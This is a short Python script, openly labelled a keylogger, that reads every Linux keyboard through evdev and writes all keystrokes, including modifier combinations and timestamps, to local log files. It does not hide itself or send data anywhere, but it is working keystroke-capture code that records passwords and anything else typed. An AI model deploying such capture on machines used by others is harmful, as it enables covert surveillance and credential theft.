#!/usr/bin/env python3
"""
Keylogger via evdev. Requires user in 'input' group:
    sudo usermod -aG input $USER
Logs go to ~/.local/share/keylogger/YYYY-MM-DD_HH-MM-SS.log
"""

import asyncio
import datetime
import os
import sys

try:
    import evdev
    from evdev import InputDevice, ecodes
except ImportError:
    print("Missing: sudo pacman -S python-evdev", file=sys.stderr)
    sys.exit(1)

LOG_DIR = os.path.expanduser("~/.local/share/keylogger")

SHIFT_KEYS  = {ecodes.KEY_LEFTSHIFT, ecodes.KEY_RIGHTSHIFT}
CTRL_KEYS   = {ecodes.KEY_LEFTCTRL,  ecodes.KEY_RIGHTCTRL}
ALT_KEYS    = {ecodes.KEY_LEFTALT,   ecodes.KEY_RIGHTALT}
META_KEYS   = {ecodes.KEY_LEFTMETA,  ecodes.KEY_RIGHTMETA}

CHAR_MAP = {
    ecodes.KEY_A: ('a','A'), ecodes.KEY_B: ('b','B'), ecodes.KEY_C: ('c','C'),
    ecodes.KEY_D: ('d','D'), ecodes.KEY_E: ('e','E'), ecodes.KEY_F: ('f','F'),
    ecodes.KEY_G: ('g','G'), ecodes.KEY_H: ('h','H'), ecodes.KEY_I: ('i','I'),
    ecodes.KEY_J: ('j','J'), ecodes.KEY_K: ('k','K'), ecodes.KEY_L: ('l','L'),
    ecodes.KEY_M: ('m','M'), ecodes.KEY_N: ('n','N'), ecodes.KEY_O: ('o','O'),
    ecodes.KEY_P: ('p','P'), ecodes.KEY_Q: ('q','Q'), ecodes.KEY_R: ('r','R'),
    ecodes.KEY_S: ('s','S'), ecodes.KEY_T: ('t','T'), ecodes.KEY_U: ('u','U'),
    ecodes.KEY_V: ('v','V'), ecodes.KEY_W: ('w','W'), ecodes.KEY_X: ('x','X'),
    ecodes.KEY_Y: ('y','Y'), ecodes.KEY_Z: ('z','Z'),
    ecodes.KEY_1: ('1','!'), ecodes.KEY_2: ('2','@'), ecodes.KEY_3: ('3','#'),
    ecodes.KEY_4: ('4','$'), ecodes.KEY_5: ('5','%'), ecodes.KEY_6: ('6','^'),
    ecodes.KEY_7: ('7','&'), ecodes.KEY_8: ('8','*'), ecodes.KEY_9: ('9','('),
    ecodes.KEY_0: ('0',')'),
    ecodes.KEY_MINUS:     ('-','_'), ecodes.KEY_EQUAL:     ('=','+'),
    ecodes.KEY_LEFTBRACE: ('[','{'), ecodes.KEY_RIGHTBRACE:(']','}'),
    ecodes.KEY_SEMICOLON: (';',':'), ecodes.KEY_APOSTROPHE:("'",'"'),
    ecodes.KEY_GRAVE:     ('`','~'), ecodes.KEY_BACKSLASH:  ('\\','|'),
    ecodes.KEY_COMMA:     (',','<'), ecodes.KEY_DOT:        ('.', '>'),
    ecodes.KEY_SLASH:     ('/','?'),
    ecodes.KEY_SPACE:     (' ',' '),
    ecodes.KEY_TAB:       ('\t','\t'),
}

SPECIAL_MAP = {
    ecodes.KEY_ENTER:     '[ENTER]',
    ecodes.KEY_BACKSPACE: '[BS]',
    ecodes.KEY_ESC:       '[ESC]',
    ecodes.KEY_CAPSLOCK:  '[CAPS]',
    ecodes.KEY_DELETE:    '[DEL]',
    ecodes.KEY_INSERT:    '[INS]',
    ecodes.KEY_HOME:      '[HOME]',
    ecodes.KEY_END:       '[END]',
    ecodes.KEY_PAGEUP:    '[PGUP]',
    ecodes.KEY_PAGEDOWN:  '[PGDN]',
    ecodes.KEY_UP:        '[UP]',
    ecodes.KEY_DOWN:      '[DOWN]',
    ecodes.KEY_LEFT:      '[LEFT]',
    ecodes.KEY_RIGHT:     '[RIGHT]',
    ecodes.KEY_F1:  '[F1]',  ecodes.KEY_F2:  '[F2]',  ecodes.KEY_F3:  '[F3]',
    ecodes.KEY_F4:  '[F4]',  ecodes.KEY_F5:  '[F5]',  ecodes.KEY_F6:  '[F6]',
    ecodes.KEY_F7:  '[F7]',  ecodes.KEY_F8:  '[F8]',  ecodes.KEY_F9:  '[F9]',
    ecodes.KEY_F10: '[F10]', ecodes.KEY_F11: '[F11]', ecodes.KEY_F12: '[F12]',
}


def find_keyboards():
    devices = []
    for path in evdev.list_devices():
        try:
            dev = InputDevice(path)
            caps = dev.capabilities()
            if ecodes.EV_KEY in caps:
                keys = caps[ecodes.EV_KEY]
                if ecodes.KEY_A in keys and ecodes.KEY_SPACE in keys:
                    devices.append(dev)
        except Exception:
            pass
    return devices


class KeyLogger:
    def __init__(self, path):
        self.path = path
        self.shift = False
        self.ctrl  = False
        self.alt   = False
        self.meta  = False
        self.caps  = False

    def write(self, text):
        with open(self.path, 'a') as f:
            f.write(text)

    def handle(self, event):
        if event.type != ecodes.EV_KEY:
            return

        code  = event.code
        value = event.value  # 0=up 1=down 2=repeat

        # Track modifiers (don't log them individually)
        if code in SHIFT_KEYS: self.shift = (value != 0); return
        if code in CTRL_KEYS:  self.ctrl  = (value != 0); return
        if code in ALT_KEYS:   self.alt   = (value != 0); return
        if code in META_KEYS:  self.meta  = (value != 0); return

        if value == 0:  # key-up, skip
            return

        ts = datetime.datetime.now().strftime('%H:%M:%S')

        if code == ecodes.KEY_CAPSLOCK:
            self.caps = not self.caps
            self.write('[CAPS]')
            return

        if code == ecodes.KEY_ENTER:
            self.write(f'\n[{ts}] ')
            return

        if code in CHAR_MAP:
            shifted = self.shift ^ self.caps
            ch = CHAR_MAP[code][1 if shifted else 0]

            mods = ''
            if self.ctrl: mods += 'C-'
            if self.alt:  mods += 'A-'
            if self.meta: mods += 'M-'

            if mods:
                self.write(f'[{mods}{ch}]')
            else:
                self.write(ch)

        elif code in SPECIAL_MAP:
            self.write(SPECIAL_MAP[code])


async def read_device(dev, logger):
    async for event in dev.async_read_loop():
        logger.handle(event)


async def main():
    os.makedirs(LOG_DIR, exist_ok=True)

    now = datetime.datetime.now()
    log_path = os.path.join(LOG_DIR, f"{now.strftime('%Y-%m-%d_%H-%M-%S')}.log")

    keyboards = find_keyboards()
    if not keyboards:
        print("No keyboards found. Run: sudo usermod -aG input $USER", file=sys.stderr)
        sys.exit(1)

    logger = KeyLogger(log_path)
    logger.write(f"=== started {now.isoformat()} ===\n")
    logger.write(f"=== devices: {', '.join(d.name for d in keyboards)} ===\n[{now.strftime('%H:%M:%S')}] ")

    print(f"logging → {log_path}", file=sys.stderr)

    await asyncio.gather(*[read_device(dev, logger) for dev in keyboards])


if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
